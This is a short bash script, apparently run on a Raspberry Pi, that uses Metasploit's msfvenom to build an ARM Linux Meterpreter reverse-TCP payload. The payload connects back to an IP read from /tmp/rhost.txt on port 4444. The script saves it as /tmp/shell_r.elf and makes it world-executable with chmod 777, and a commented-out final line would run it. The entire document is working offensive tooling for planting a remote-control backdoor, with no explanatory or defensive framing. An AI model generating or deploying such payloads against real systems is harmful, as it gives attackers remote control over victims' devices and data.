#!/bin/bash
ip=`cat /tmp/rhost.txt`
/home/pi/tools/metasploit-framework/msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -f elf > /tmp/shell_r.elf
sudo chmod 777 /tmp/shell_r.elf
#/tmp/shell_r.elf
